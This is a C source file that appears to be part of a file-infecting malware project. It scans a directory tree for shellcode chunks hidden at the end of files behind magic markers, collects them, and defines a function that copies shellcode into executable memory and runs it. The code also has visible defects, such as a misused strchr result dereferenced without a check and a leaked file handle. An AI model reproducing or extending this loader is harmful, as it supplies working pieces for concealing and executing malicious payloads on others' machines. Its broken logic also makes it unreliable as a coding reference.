#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include "../includes/utils.h"
#include "../includes/infection.h"

#define BLKSIZE 1024

void execute_shellcode(t_shellcode *shellcode) {
  void *executable_memory;

  executable_memory = mmap(NULL, shellcode->length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
  if (executable_memory == (void*)-1) { // Checks if mmap() returned an error.
    perror("my_loader");
    munmap(executable_memory, shellcode->length);
    return ;
  }
  memcpy(executable_memory, shellcode->buf, shellcode->length);
  void (*func)() = (void (*)())executable_memory;
  func();
  return;
}

// Returns NULL if no shellcode found, otherwise returns a pointer to the file.
FILE *detect_shellcode(char *path) {
  FILE *file;
  char buf[BLKSIZE];
  long offset;
  long file_size;
  int *magic_byte;

  if (!path)
    return (NULL);
  file = fopen(path, "rb");
  if (!file)
    return (NULL);
  bzero(buf, BLKSIZE);
  file_size = size_of_file(file);
  offset = (file_size < BLKSIZE) ? file_size : BLKSIZE;
  while (fseek(file, -offset, SEEK_END) != -1) {
    if (fread(buf, sizeof(char), BLKSIZE, file) < 1)
      return (NULL);
    magic_byte = (int *)strchr(buf, 0xF33L);
    if (*magic_byte == 0xF33L && *(magic_byte + 1) == 0x600D) {
      fseek(file, -(offset - (buf - (char *)magic_byte)),  SEEK_END);
      return (file);
    }
    offset += BLKSIZE;
  }
  fclose(file);
  return (NULL);
}

t_list *find_shellcode_chunks(char *root_path) {
  t_list *files;
  t_list *chunk_list = NULL;
  t_list *list_ptr;
  FILE *fp;

  if (!root_path)
    return (NULL);
  files = find_files(root_path);
  if (!files)
    return (NULL);
  list_ptr = files;
  while (list_ptr) {
    fp = detect_shellcode(((t_file *)list_ptr->data)->absolute_path);
    if (fp) { // I hope we can assume that the file position indicator will be accurate.
      if (!chunk_list)
        chunk_list = new_list(read_shellcode(fp));
      else
        list_add_front(&chunk_list, read_shellcode(fp));
    }
    list_ptr = list_ptr->next;
  }
  return (chunk_list);
}

int main(int argc, char *argv[]) {
  t_list *shellcode_chunks;

  if (argc != 2)
    return (1);
  shellcode_chunks = find_shellcode_chunks(argv[1]);
  if (shellcode_chunks)
    printf("Hello\n");
  while (shellcode_chunks != NULL) {
    printf("%s\n", ((t_shellcode*)shellcode_chunks->data)->buf);
    shellcode_chunks = shellcode_chunks->next;
  }
  return (0);
}
